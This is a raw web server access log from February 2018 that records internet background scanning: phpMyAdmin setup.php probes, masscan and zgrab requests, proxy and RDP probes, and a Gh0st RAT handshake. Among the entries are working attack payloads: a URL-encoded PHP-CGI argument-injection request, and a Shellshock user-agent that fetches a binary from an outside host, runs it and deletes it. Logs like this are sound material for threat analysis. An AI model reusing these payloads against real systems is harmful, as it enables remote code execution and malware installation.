195.54.47.52 - - [03/Feb/2018:18:12:19 +0000] "GET /mysqladmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:20 +0000] "GET /mysql/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:20 +0000] "GET /mysql/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:20 +0000] "GET /phpmyadmin2/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:20 +0000] "GET /phpmyadmin2/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:20 +0000] "GET /phpMyAdmin2/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:20 +0000] "GET /phpMyAdmin2/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:20 +0000] "GET /phpMyAdmin/scripts/setup0.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:20 +0000] "GET /phpMyAdmin/scripts/setup0.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:21 +0000] "GET /phpmyadmin/scripts/setup1.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:21 +0000] "GET /phpmyadmin/scripts/setup1.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:21 +0000] "GET /phpMyAdmin/scripts/setup1.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:21 +0000] "GET /phpMyAdmin/scripts/setup1.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:21 +0000] "GET /_phpmyadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:21 +0000] "GET /_phpmyadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:21 +0000] "GET /php-my-admin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:21 +0000] "GET /php-my-admin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:22 +0000] "GET /phpmyadmin_/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:22 +0000] "GET /phpmyadmin_/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:22 +0000] "GET /phpmyadmin/scripts/_setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:22 +0000] "GET /phpmyadmin/scripts/_setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:22 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:22 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:22 +0000] "GET /phpmyadmin/scripts/Setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:22 +0000] "GET /phpmyadmin/scripts/Setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:23 +0000] "GET /_phpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:23 +0000] "GET /_phpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:23 +0000] "GET /phpMyAdmin_/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:23 +0000] "GET /phpMyAdmin_/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:23 +0000] "GET /phpMyAdmin/scripts/_setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:23 +0000] "GET /phpMyAdmin/scripts/_setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:23 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:23 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:24 +0000] "GET /phpMyAdmin/scripts.setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:24 +0000] "GET /phpMyAdmin/scripts.setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:24 +0000] "GET /phpMyAdmin/scripts/Setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:24 +0000] "GET /phpMyAdmin/scripts/Setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:24 +0000] "GET /PhpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:24 +0000] "GET /PhpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:24 +0000] "GET /PHPMYADMIN/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:24 +0000] "GET /PHPMYADMIN/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:25 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:25 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:25 +0000] "GET /PMA/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:25 +0000] "GET /PMA/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:25 +0000] "GET /scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:25 +0000] "GET /scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:25 +0000] "GET /sql/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:25 +0000] "GET /sql/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
63.246.129.99 - - [03/Feb/2018:20:14:52 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
123.14.184.71 - - [03/Feb/2018:22:24:38 +0000] "GET / HTTP/1.0" 200 264 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
66.118.142.165 - - [04/Feb/2018:01:13:26 +0000] "HEAD /scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
60.191.38.78 - - [04/Feb/2018:01:48:22 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
36.3.93.226 - - [04/Feb/2018:02:55:55 +0000] "GET / HTTP/1.1" 200 264 "-" "curl/7.40.0"
63.246.129.99 - - [04/Feb/2018:04:02:35 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
5.101.6.170 - - [04/Feb/2018:05:02:59 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
51.140.101.77 - - [04/Feb/2018:05:28:26 +0000] "CONNECT 51.140.55.230:9001 HTTP/1.0" 400 173 "-" "-"
115.231.219.12 - - [04/Feb/2018:09:08:53 +0000] "GET /manager/html HTTP/1.1" 404 169 "-" "Mozilla/3.0 (compatible; Indy Library)"
5.101.40.8 - - [04/Feb/2018:09:49:31 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 173 "-" "-"
185.222.210.29 - - [04/Feb/2018:11:47:00 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "-"
89.248.172.90 - - [04/Feb/2018:13:44:39 +0000] "GET http://httpheader.net/ HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
89.248.172.90 - - [04/Feb/2018:13:45:05 +0000] "\x04\x01\x00P\xC0c\xF660\x00" 400 173 "-" "-"
89.248.172.90 - - [04/Feb/2018:13:45:05 +0000] "\x04\x01\x00P\xC0c\xF660\x00" 400 173 "-" "-"
89.248.172.90 - - [04/Feb/2018:13:45:06 +0000] "\x05\x01\x00" 400 173 "-" "-"
63.246.129.99 - - [04/Feb/2018:15:06:46 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
60.12.107.130 - - [04/Feb/2018:20:14:16 +0000] "POST //%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1" 404 169 "-" "-"
164.52.24.140 - - [04/Feb/2018:22:33:44 +0000] "\x16\x03\x01\x01\x22\x01\x00\x01\x1E\x03\x036\x9D\xE6\xCD\xB10O\xA9\xC5\xF5\xA4\x07u\xD2\xF5^P\xC8\xB1v\x9E5\xFD\x97\x1FVVN\x0E\x05\xBE\x85\x00\x00\x88\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 173 "-" "-"
164.52.24.140 - - [04/Feb/2018:22:33:50 +0000] "USER test +iw test :Test Wuz Here" 400 173 "-" "-"
164.52.24.140 - - [04/Feb/2018:22:33:50 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
60.191.38.78 - - [04/Feb/2018:22:53:44 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
51.140.85.42 - - [04/Feb/2018:23:05:43 +0000] "CONNECT 51.140.55.230:9001 HTTP/1.0" 400 173 "-" "-"
51.140.55.230 - - [05/Feb/2018:00:59:01 +0000] "CONNECT 51.140.55.230:9001 HTTP/1.0" 400 173 "-" "-"
66.118.142.165 - - [05/Feb/2018:01:26:22 +0000] "HEAD /phpMyAdmin/scripts/setup.php HTTP/1.0" 404 0 "-" "-"
63.246.129.99 - - [05/Feb/2018:02:20:32 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
172.104.115.143 - - [05/Feb/2018:05:53:34 +0000] "GET /favicon.ico HTTP/1.1" 200 1665 "-" "Mozilla/5.0 zgrab/0.x"
66.118.142.165 - - [05/Feb/2018:06:04:03 +0000] "HEAD /phpMyAdmin/scripts/setup.php HTTP/1.0" 404 0 "-" "-"
172.104.108.109 - - [05/Feb/2018:06:16:57 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0"
51.140.55.230 - - [05/Feb/2018:06:49:44 +0000] "CONNECT 51.140.55.230:9001 HTTP/1.0" 400 173 "-" "-"
60.191.38.77 - - [05/Feb/2018:07:42:16 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
27.109.192.229 - - [05/Feb/2018:09:33:02 +0000] "GET / HTTP/1.0" 200 264 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/45.0.2454.85"
63.246.129.99 - - [05/Feb/2018:10:04:37 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
210.43.96.229 - - [05/Feb/2018:13:02:53 +0000] "GET /phpmyadmin HTTP/1.1" 404 571 "http://35.196.196.232/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
210.43.96.229 - - [05/Feb/2018:13:02:53 +0000] "GET /phpmyadmin HTTP/1.1" 404 571 "http://35.196.196.232/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
139.162.114.70 - - [05/Feb/2018:17:07:26 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
122.195.166.15 - - [05/Feb/2018:18:37:06 +0000] "POST //%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1" 404 169 "-" "-"
66.118.142.165 - - [05/Feb/2018:22:00:44 +0000] "HEAD /phpMyAdmin/scripts/setup.php HTTP/1.0" 404 0 "-" "-"
195.22.127.249 - - [05/Feb/2018:22:48:22 +0000] "GET /.git/HEAD HTTP/1.1" 404 200 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
139.162.194.176 - - [05/Feb/2018:23:37:39 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
125.39.222.44 - - [06/Feb/2018:00:37:36 +0000] "CONNECT 35.196.196.232 HTTP/1.1" 400 173 "-" "-"
107.170.236.126 - - [06/Feb/2018:01:06:00 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 zgrab/0.x"
221.239.98.123 - - [06/Feb/2018:01:12:38 +0000] "GET http://boxun.com/ HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like GeckoMozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
106.45.1.19 - - [06/Feb/2018:01:12:38 +0000] "GET http://www.wujieliulan.com/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
27.156.88.93 - - [06/Feb/2018:01:12:39 +0000] "GET http://www.minghui.org/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
221.11.230.213 - - [06/Feb/2018:01:12:39 +0000] "GET http://www.rfa.org/english/ HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
124.90.49.159 - - [06/Feb/2018:01:12:40 +0000] "GET http://www.123cha.com/ HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
221.11.229.157 - - [06/Feb/2018:01:12:42 +0000] "CONNECT www.voanews.com:443 HTTP/1.1" 400 0 "-" "-"
120.36.123.241 - - [06/Feb/2018:01:12:43 +0000] "GET http://www.epochtimes.com/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like GeckoMozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
221.14.169.111 - - [06/Feb/2018:01:12:44 +0000] "CONNECT cn.bing.com:443 HTTP/1.1" 400 173 "-" "-"
123.158.61.49 - - [06/Feb/2018:01:12:45 +0000] "CONNECT www.baidu.com:443 HTTP/1.1" 400 173 "-" "-"
115.198.200.223 - - [06/Feb/2018:01:12:45 +0000] "GET http://www.ip.cn/ HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
63.246.129.99 - - [06/Feb/2018:01:22:52 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
5.188.87.7 - - [06/Feb/2018:03:46:39 +0000] "GET / HTTP/1.0" 200 264 "-" "Mozilla/5.0"
107.170.236.113 - - [06/Feb/2018:04:02:19 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 zgrab/0.x"
196.52.43.115 - - [06/Feb/2018:05:38:42 +0000] "GET / HTTP/1.0" 200 264 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0"
199.247.9.230 - - [06/Feb/2018:07:23:39 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
199.247.9.230 - - [06/Feb/2018:07:23:39 +0000] "GET /HNAP1/ HTTP/1.1" 404 143 "http://35.196.196.232/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
66.240.205.34 - - [06/Feb/2018:08:14:39 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 173 "-" "-"
63.246.129.99 - - [06/Feb/2018:10:21:51 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
178.33.133.106 - - [06/Feb/2018:10:26:14 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
178.33.133.106 - - [06/Feb/2018:10:26:40 +0000] "GET / HTTP/1.0" 200 264 "-" "() { :;}; /bin/bash -c \x22curl -o /tmp/log http://mafiagalati.hi2.ro/log;/usr/bin/wget http://mafiagalati.hi2.ro/log -O /tmp/log;wget http://mafiagalati.hi2.ro/log -O /dev/shm/log;chmod +x /dev/shm/log /tmp/log;/dev/shm/log;/tmp/log;rm -rf /dev/shm/log /tmp/log*\x22"
61.240.145.2 - - [06/Feb/2018:11:08:17 +0000] "GET /cgi/online.asp?hostname=[WIN-X6HF63]&httptype=[1][not%20httptunnel] HTTP/1.1" 404 571 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
191.96.249.136 - - [06/Feb/2018:14:30:09 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
46.161.9.57 - - [06/Feb/2018:14:54:01 +0000] "\x04\x01\x00P.\xA1\x099\x00" 400 173 "-" "-"
46.161.9.57 - - [06/Feb/2018:16:06:32 +0000] "\x05\x01\x00" 400 173 "-" "-"
185.222.210.29 - - [06/Feb/2018:17:07:27 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "-"
51.143.153.83 - - [06/Feb/2018:20:32:38 +0000] "CONNECT 51.140.55.230:9001 HTTP/1.0" 400 173 "-" "-"
